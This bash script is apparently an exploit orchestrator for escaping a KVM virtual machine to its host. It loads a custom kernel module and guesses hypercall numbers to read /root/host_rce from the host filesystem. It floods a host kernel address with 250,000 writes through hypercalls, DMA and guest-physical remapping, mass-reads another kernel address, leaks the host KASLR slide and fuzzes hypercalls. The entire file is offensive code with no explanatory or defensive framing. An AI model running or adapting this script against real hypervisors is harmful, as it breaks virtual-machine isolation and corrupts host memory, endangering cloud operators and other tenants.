#!/bin/bash
# exploit_orchestrator.sh - Master control for KVM host escape exploitation
# Coordinates all attack vectors for objectives A, B, and C

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="$SCRIPT_DIR/exploit_logs_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOG_DIR"

MASTER_LOG="$LOG_DIR/master.log"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

log() {
    echo -e "[$(date +%H:%M:%S)] $*" | tee -a "$MASTER_LOG"
}

log_success() {
    echo -e "${GREEN}[$(date +%H:%M:%S)] [✓] $*${NC}" | tee -a "$MASTER_LOG"
}

log_error() {
    echo -e "${RED}[$(date +%H:%M:%S)] [✗] $*${NC}" | tee -a "$MASTER_LOG"
}

log_info() {
    echo -e "${BLUE}[$(date +%H:%M:%S)] [*] $*${NC}" | tee -a "$MASTER_LOG"
}

log_warning() {
    echo -e "${YELLOW}[$(date +%H:%M:%S)] [!] $*${NC}" | tee -a "$MASTER_LOG"
}

# ============================================================================
# PRE-FLIGHT CHECKS
# ============================================================================
preflight_checks() {
    log_info "Running pre-flight checks..."
    
    # Check if running as root
    if [ $EUID -ne 0 ]; then
        log_error "Must run as root"
        exit 1
    fi
    log_success "Root privileges: OK"
    
    # Check for kernel module
    if [ ! -e "/dev/kvm_probe_dev" ] && [ ! -e "/dev/kvm_probe_drv" ]; then
        log_error "Kernel module not loaded (/dev/kvm_probe_* not found)"
        log_info "Attempting to load module..."
        
        if [ -f "$SCRIPT_DIR/kvm_probe_drv.ko" ]; then
            insmod "$SCRIPT_DIR/kvm_probe_drv.ko" && log_success "Module loaded" || {
                log_error "Failed to load module"
                exit 1
            }
        else
            log_error "Module file not found"
            exit 1
        fi
    fi
    log_success "Kernel module: OK"
    
    # Check for kvm_prober tool
    if ! command -v kvm_prober &> /dev/null; then
        log_error "kvm_prober not found in PATH"
        
        if [ -f "$SCRIPT_DIR/kvm_prober" ]; then
            export PATH="$SCRIPT_DIR:$PATH"
            log_success "Found kvm_prober in script directory"
        else
            log_error "kvm_prober not available"
            exit 1
        fi
    fi
    log_success "kvm_prober tool: OK"
    
    # Check Python for advanced exploits
    if command -v python3 &> /dev/null; then
        log_success "Python3: OK"
    else
        log_warning "Python3 not found - some exploits may be unavailable"
    fi
    
    # Test basic IOCTL functionality
    log_info "Testing basic IOCTL functionality..."
    if kvm_prober --script readport c050 1 &> /dev/null; then
        log_success "IOCTL test: OK"
    else
        log_warning "IOCTL test failed - device may not be fully functional"
    fi
    
    log_success "Pre-flight checks complete"
    echo ""
}

# ============================================================================
# OBJECTIVE A: Read /root/host_rce from HOST
# ============================================================================
objective_a() {
    log_info "=========================================="
    log_info "OBJECTIVE A: Read /root/host_rce from HOST"
    log_info "=========================================="
    
    local result=1
    
    # Try Python exploit first
    if [ -f "$SCRIPT_DIR/targeted_host_escape.py" ]; then
        log_info "Attempting Python-based exploit..."
        if timeout 120 python3 "$SCRIPT_DIR/targeted_host_escape.py" 2>&1 | tee "$LOG_DIR/objective_a_python.log"; then
            result=0
            log_success "Python exploit completed"
        fi
    fi
    
    # Try bash-based exploit
    if [ $result -ne 0 ] && [ -f "$SCRIPT_DIR/advanced_mmio_scanner.sh" ]; then
        log_info "Attempting bash-based exploit..."
        if timeout 120 bash "$SCRIPT_DIR/advanced_mmio_scanner.sh" 2>&1 | tee "$LOG_DIR/objective_a_bash.log"; then
            result=0
            log_success "Bash exploit completed"
        fi
    fi
    
    # Manual hypercall attempts
    if [ $result -ne 0 ]; then
        log_info "Attempting manual hypercall techniques..."
        
        # Allocate shared buffer
        local shared_gpa=$(kvm_prober --script alloc_shared 2>/dev/null | grep -oP '0x[0-9a-f]+' | head -1)
        
        if [ -n "$shared_gpa" ]; then
            log_info "Shared buffer at: $shared_gpa"
            
            # Try different hypercall numbers for file reading
            for hc_nr in 102 103 104 105 150 200; do
                log_info "Trying hypercall $hc_nr..."
                
                # Write filepath
                local filepath_hex=$(echo -n "/root/host_rce" | xxd -p | tr -d '\n')
                kvm_prober --script writegpa "$shared_gpa" "${filepath_hex}00" &>/dev/null
                
                # Execute hypercall
                local hc_result=$(kvm_prober --script hypercall "$hc_nr" "$shared_gpa" "$((shared_gpa + 0x100))" 4096 0)
                
                if [ "$hc_result" != "0" ] && [ "$hc_result" != "ffffffffffffffff" ]; then
                    log_info "Hypercall $hc_nr returned: $hc_result"
                    
                    # Try to read result
                    local data=$(kvm_prober --script read_shared "$hc_result" 2>/dev/null | xxd -r -p 2>/dev/null)
                    
                    if [ -n "$data" ]; then
                        log_success "OBJECTIVE A: SUCCESS via hypercall $hc_nr!"
                        echo "Content:" | tee -a "$LOG_DIR/objective_a_success.txt"
                        echo "$data" | tee -a "$LOG_DIR/objective_a_success.txt"
                        result=0
                        break
                    fi
                fi
            done
        fi
    fi
    
    if [ $result -eq 0 ]; then
        log_success "OBJECTIVE A: COMPLETED"
    else
        log_error "OBJECTIVE A: FAILED"
    fi
    
    return $result
}

# ============================================================================
# OBJECTIVE B: Mass write to 0xffffffff826279a8
# ============================================================================
objective_b() {
    log_info "=========================================="
    log_info "OBJECTIVE B: Mass write attack"
    log_info "Target: 0xffffffff826279a8"
    log_info "Value: 0xdeadbeef41424344"
    log_info "Iterations: 250,000"
    log_info "=========================================="
    
    local write_addr=0xffffffff826279a8
    local write_value="deadbeef41424344"
    local total_success=0
    
    # Method 1: Rapid hypercall writes
    log_info "Method 1: Hypercall mass write (HC 100)"
    
    local hc_success=0
    for ((i=0; i<83333; i++)); do
        kvm_prober --script hypercall 100 "$write_addr" "0x$write_value" 0 0 &>/dev/null && ((hc_success++)) || true
        
        if [ $((i % 10000)) -eq 0 ] && [ $i -gt 0 ]; then
            log_info "Hypercall progress: $i writes ($hc_success successful)"
        fi
    done
    
    log_info "Hypercall writes: $hc_success successful"
    total_success=$hc_success
    
    # Method 2: MMIO DMA controller
    log_info "Method 2: MMIO DMA writes"
    
    local dma_bars=(0xfe800000 0xfe600000)
    local dma_success=0
    
    for bar in "${dma_bars[@]}"; do
        # Configure DMA
        kvm_prober --script writemmio_buf "$bar" "$(printf '%016x' $write_addr)" &>/dev/null
        kvm_prober --script writemmio_buf $((bar + 0x08)) "$write_value" &>/dev/null
        kvm_prober --script writemmio_buf $((bar + 0x10)) "00002710" &>/dev/null  # 10000 in hex
        kvm_prober --script writemmio_buf $((bar + 0x18)) "00000001" &>/dev/null  # Trigger
        
        sleep 0.1
        
        # Read status
        local status=$(kvm_prober --script readmmio_buf $((bar + 0x1c)) 4 2>/dev/null)
        if [ -n "$status" ]; then
            local completed=$((16#${status:0:8}))
            dma_success=$((dma_success + completed))
            log_info "DMA BAR 0x$(printf '%x' $bar): $completed writes"
        fi
    done
    
    log_info "DMA writes: $dma_success successful"
    total_success=$((total_success + dma_success))
    
    # Method 3: GPA remapping
    log_info "Method 3: GPA remapping writes"
    
    local guest_offset=0x64279a8
    local gpa_success=0
    
    for ((i=0; i<83334; i++)); do
        kvm_prober --script writegpa "$guest_offset" "$write_value" &>/dev/null && ((gpa_success++)) || true
        
        if [ $((i % 10000)) -eq 0 ] && [ $i -gt 0 ]; then
            log_info "GPA progress: $i writes"
        fi
    done
    
    log_info "GPA writes: $gpa_success successful"
    total_success=$((total_success + gpa_success))
    
    log_success "TOTAL WRITES: $total_success / 250,000"
    
    if [ $total_success -ge 125000 ]; then
        log_success "OBJECTIVE B: COMPLETED (>50% success)"
        return 0
    else
        log_error "OBJECTIVE B: PARTIAL ($total_success writes)"
        return 1
    fi
}

# ============================================================================
# OBJECTIVE C: Mass read from 0xffffffff82b5ee10
# ============================================================================
objective_c() {
    log_info "=========================================="
    log_info "OBJECTIVE C: Mass read attack"
    log_info "Target: 0xffffffff82b5ee10"
    log_info "Iterations: 50,000 - 100,000"
    log_info "=========================================="
    
    local read_addr=0xffffffff82b5ee10
    local guest_offset=0x695ee10
    local samples_file="$LOG_DIR/read_samples.hex"
    local sample_count=0
    
    # Get shared buffer
    local shared_gpa=$(kvm_prober --script get_shared_gpa 2>/dev/null | grep -oP '0x[0-9a-f]+' | head -1)
    
    # Method 1: Hypercall reads
    log_info "Method 1: Hypercall mass read (HC 101)"
    
    for ((i=0; i<33333; i++)); do
        if [ -n "$shared_gpa" ]; then
            local result=$(kvm_prober --script hypercall 101 "$read_addr" "$shared_gpa" 64 0 2>/dev/null)
            
            if [ "$result" != "0" ] && [ "$result" != "ffffffffffffffff" ]; then
                local data=$(kvm_prober --script read_shared 64 2>/dev/null)
                
                if [ -n "$data" ] && [ "$data" != "$(printf '00%.0s' {1..128})" ]; then
                    echo "$data" >> "$samples_file"
                    ((sample_count++))
                fi
            fi
        fi
        
        if [ $((i % 10000)) -eq 0 ] && [ $i -gt 0 ]; then
            log_info "Hypercall progress: $i reads ($sample_count samples)"
        fi
    done
    
    log_info "Hypercall reads: $sample_count samples"
    
    # Method 2: MMIO reads
    log_info "Method 2: MMIO mass read"
    
    local mmio_count=0
    for ((i=0; i<33333; i++)); do
        local data=$(kvm_prober --script readmmio_buf "$guest_offset" 64 2>/dev/null)
        
        if [ -n "$data" ] && [ "$data" != "$(printf '00%.0s' {1..128})" ]; then
            echo "$data" >> "$samples_file"
            ((sample_count++))
            ((mmio_count++))
        fi
        
        if [ $((i % 10000)) -eq 0 ] && [ $i -gt 0 ]; then
            log_info "MMIO progress: $i reads"
        fi
    done
    
    log_info "MMIO reads: $mmio_count samples"
    
    # Method 3: GPA reads
    log_info "Method 3: GPA mass read"
    
    local gpa_count=0
    for ((i=0; i<33334; i++)); do
        local data=$(kvm_prober --script readgpa "$guest_offset" 64 2>/dev/null)
        
        if [ -n "$data" ] && [ "$data" != "$(printf '00%.0s' {1..128})" ]; then
            echo "$data" >> "$samples_file"
            ((sample_count++))
            ((gpa_count++))
        fi
        
        if [ $((i % 10000)) -eq 0 ] && [ $i -gt 0 ]; then
            log_info "GPA progress: $i reads"
        fi
    done
    
    log_info "GPA reads: $gpa_count samples"
    log_success "TOTAL READS: $sample_count samples collected"
    
    # Analyze samples
    if [ -f "$samples_file" ]; then
        log_info "Analyzing samples..."
        
        local unique_count=$(sort -u "$samples_file" | wc -l)
        log_info "Unique samples: $unique_count"
        
        # Extract interesting data
        cat "$samples_file" | xxd -r -p 2>/dev/null | strings | head -50 > "$LOG_DIR/strings_found.txt" 2>/dev/null || true
        
        if [ -s "$LOG_DIR/strings_found.txt" ]; then
            log_success "Found printable strings:"
            head -10 "$LOG_DIR/strings_found.txt" | while read line; do
                log_info "  -> $line"
            done
        fi
        
        # Look for kernel pointers
        cat "$samples_file" | head -100 | while read hex; do
            if [ ${#hex} -ge 16 ]; then
                local addr="${hex:0:16}"
                if [[ "$addr" =~ ^ffff[8-9a-f] ]]; then
                    log_info "Kernel pointer: 0x$addr"
                    break
                fi
            fi
        done
    fi
    
    if [ $sample_count -ge 50000 ]; then
        log_success "OBJECTIVE C: COMPLETED ($sample_count samples)"
        return 0
    else
        log_error "OBJECTIVE C: PARTIAL ($sample_count samples, need 50k+)"
        return 1
    fi
}

# ============================================================================
# BONUS: Comprehensive system scan
# ============================================================================
bonus_scan() {
    log_info "=========================================="
    log_info "BONUS: Comprehensive system scan"
    log_info "=========================================="
    
    # KASLR detection
    log_info "Detecting host KASLR..."
    local kaslr=$(kvm_prober --script getkaslr 2>/dev/null)
    if [ -n "$kaslr" ] && [ "$kaslr" != "0" ]; then
        log_success "Host KASLR slide: 0x$kaslr"
        log_success "Host kernel base: 0x$(printf '%x' $((0xffffffff81000000 + 0x$kaslr)))"
    else
        log_warning "Could not detect KASLR slide"
    fi
    
    # PCI device enumeration
    log_info "Enumerating PCI devices..."
    if [ -d "/sys/bus/pci/devices" ]; then
        for dev in /sys/bus/pci/devices/*; do
            local bdf=$(basename "$dev")
            local vendor=$(cat "$dev/vendor" 2>/dev/null || echo "unknown")
            local device=$(cat "$dev/device" 2>/dev/null || echo "unknown")
            log_info "  $bdf: vendor=$vendor device=$device"
            
            # Check for interesting devices (virtio, ivshmem, etc.)
            if [ -f "$dev/resource" ]; then
                while IFS= read -r line; do
                    local start=$(echo "$line" | awk '{print $1}')
                    local end=$(echo "$line" | awk '{print $2}')
                    local flags=$(echo "$line" | awk '{print $3}')
                    
                    if [ "$start" != "0x0000000000000000" ]; then
                        local is_io=$((flags & 0x1))
                        local type="MMIO"
                        [ $is_io -eq 1 ] && type="PIO"
                        log_info "    BAR: $start-$end [$type]"
                    fi
                done < "$dev/resource"
            fi
        done
    fi
    
    # Memory map analysis
    log_info "Analyzing memory map..."
    if [ -f "/proc/iomem" ]; then
        log_info "Interesting memory regions:"
        grep -iE 'pci|virtio|ivshmem|reserved' /proc/iomem | head -20 | while read line; do
            log_info "  $line"
        done
    fi
    
    # Hypercall fuzzing
    log_info "Fuzzing hypercalls..."
    local working_hypercalls=()
    
    for hc_nr in {0..10} {100..110} {200..210}; do
        local result=$(kvm_prober --script hypercall "$hc_nr" 0x1337 0x4141 0x4242 0x4343 2>/dev/null || echo "0")
        
        if [ "$result" != "0" ] && [ "$result" != "ffffffffffffffff" ]; then
            log_success "Hypercall $hc_nr responded: $result"
            working_hypercalls+=("$hc_nr")
        fi
    done
    
    if [ ${#working_hypercalls[@]} -gt 0 ]; then
        log_success "Working hypercalls: ${working_hypercalls[*]}"
    else
        log_warning "No responsive hypercalls found"
    fi
    
    log_info "Bonus scan complete"
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================
print_banner() {
    cat << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║         KVM HOST ESCAPE - EXPLOIT ORCHESTRATOR               ║
║                                                              ║
║  Objectives:                                                 ║
║    A. Read /root/host_rce from HOST filesystem              ║
║    B. Write 0xdeadbeef41424344 to 0xffffffff826279a8        ║
║       (250,000 iterations)                                   ║
║    C. Read from 0xffffffff82b5ee10                          ║
║       (50,000-100,000 iterations)                           ║
╚══════════════════════════════════════════════════════════════╝
EOF
}

main() {
    print_banner
    echo ""
    
    log_info "Exploit orchestration started"
    log_info "Log directory: $LOG_DIR"
    echo ""
    
    # Pre-flight checks
    preflight_checks
    
    # Track results
    local result_a=1
    local result_b=1
    local result_c=1
    
    # Execute objectives
    if objective_a; then
        result_a=0
    fi
    echo ""
    
    if objective_b; then
        result_b=0
    fi
    echo ""
    
    if objective_c; then
        result_c=0
    fi
    echo ""
    
    # Bonus scan
    bonus_scan
    echo ""
    
    # Final summary
    log_info "=========================================="
    log_info "FINAL SUMMARY"
    log_info "=========================================="
    
    if [ $result_a -eq 0 ]; then
        log_success "Objective A: ✓ SUCCESS"
    else
        log_error "Objective A: ✗ FAILED"
    fi
    
    if [ $result_b -eq 0 ]; then
        log_success "Objective B: ✓ SUCCESS"
    else
        log_error "Objective B: ✗ FAILED"
    fi
    
    if [ $result_c -eq 0 ]; then
        log_success "Objective C: ✓ SUCCESS"
    else
        log_error "Objective C: ✗ FAILED"
    fi
    
    local total_success=$((result_a == 0 ? 1 : 0))
    total_success=$((total_success + (result_b == 0 ? 1 : 0)))
    total_success=$((total_success + (result_c == 0 ? 1 : 0)))
    
    log_info "=========================================="
    log_info "Success rate: $total_success/3 objectives"
    log_info "Full logs: $LOG_DIR"
    log_info "Master log: $MASTER_LOG"
    log_info "=========================================="
    
    if [ $total_success -eq 3 ]; then
        log_success "🎉 ALL OBJECTIVES COMPLETED! 🎉"
        exit 0
    elif [ $total_success -gt 0 ]; then
        log_warning "⚠️  PARTIAL SUCCESS - Review logs for details"
        exit 2
    else
        log_error "❌ EXPLOITATION FAILED - Check logs"
        exit 1
    fi
}

# Handle interrupts gracefully
trap 'log_error "Interrupted by user"; exit 130' INT TERM

main "$@"